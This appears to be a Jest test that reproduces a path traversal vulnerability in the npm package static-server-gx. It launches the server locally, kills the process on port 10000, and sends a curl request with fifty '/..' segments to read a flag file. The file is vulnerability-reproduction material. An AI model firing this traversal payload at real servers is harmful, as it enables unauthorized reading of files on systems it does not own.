const v24 = require('child_process');
var execSync = v24.execSync;
const v26 = () => {
    try {
        const v25 = execSync('fuser -k 10000/tcp');
        v25;
    } catch (e) {
    }
};
const v27 = afterAll(v26);
v27;
const path = require('path');
const v28 = require('sleep');
const sleep = v28.sleep;
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v29 = '/..'.repeat(50);
    const v30 = v29 + pathToFlag;
    return v30;
};
const v45 = done => {
    const v31 = expect.assertions(1);
    v31;
    const fs = require('fs');
    const sleep = require('sleep');
    const v32 = require('child_process');
    const exec = v32.exec;
    const v33 = fs.readFileSync(pathToFlag);
    let hostsFile = v33.toString();
    const a = require('child_process');
    try {
        const v34 = () => {
        };
        const v35 = a.execSync('fuser -k 10000/tcp', v34);
        v35;
    } catch (e) {
    }
    let server = 'node ./node_modules/static-server-gx/server.js';
    const v36 = (error, stdout) => {
    };
    const v37 = exec(server, v36);
    v37;
    const v38 = sleep.sleep(2);
    v38;
    const v39 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:10000${ v39 }"`;
    const v43 = (error, stdout) => {
        const v40 = expect(stdout);
        const v41 = v40.toBe(hostsFile);
        v41;
        const v42 = done();
        v42;
    };
    const v44 = exec(attack_string, v43);
    v44;
};
const v46 = test('Path Traversal in static-server-gx', v45);
v46;